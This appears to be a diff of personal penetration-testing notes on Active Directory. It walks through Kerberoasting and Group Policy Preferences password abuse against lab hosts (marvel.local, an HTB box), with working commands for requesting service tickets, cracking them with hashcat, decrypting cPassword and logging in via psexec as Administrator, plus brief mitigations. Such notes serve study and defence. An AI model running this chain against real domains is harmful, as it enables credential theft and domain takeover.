@@ -350,3 +350,51 @@
     * Account tiering
 
     * Local admin restriction
+
+* Kerberoasting:
+
+  * Goal of [Kerberoasting](https://medium.com/@Shorty420/kerberoasting-9108477279cc) is to get TGS (Ticket Granting Service) and decrypt the server's account hash.
+
+  ```shell
+  GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request
+  #needs username, password from domain account and its ip
+  #this provides us the hash, can be cracked using hashcat
+
+  hashcat -m 13100 hash.txt rockyou.txt
+  #cracks the hash
+  ```
+
+  * Mitigations:
+
+    * Strong passwords
+
+    * Least privilege (service accounts should not be made domain admins)
+
+* GPP (Group Policy Preferences):
+
+  * [GPP](https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/) allowed admins to create policies using embedded creds (cPassword) which got leaked; patched in MS14-025.
+
+  ```shell
+  #after basic enumeration via nmap
+  #we get to know that it is domain controller
+
+  smbclient -L \\\\10.10.10.100\\
+  #includes SYSVOL
+
+  smbclient -L \\\\10.10.10.100\\Replication
+  #accessing an open share
+  #find Groups.xml, which includes CPassword
+
+  #in attacker machine
+  gpp-decrypt <CPassword>
+  #gives password
+
+  #with username and password, we can use Kerberoasting
+  GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+  #gives service ticket hash
+
+  hashcat -m 13100 hash.txt rockyou.txt
+  #cracks hash
+
+  psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
+  ```
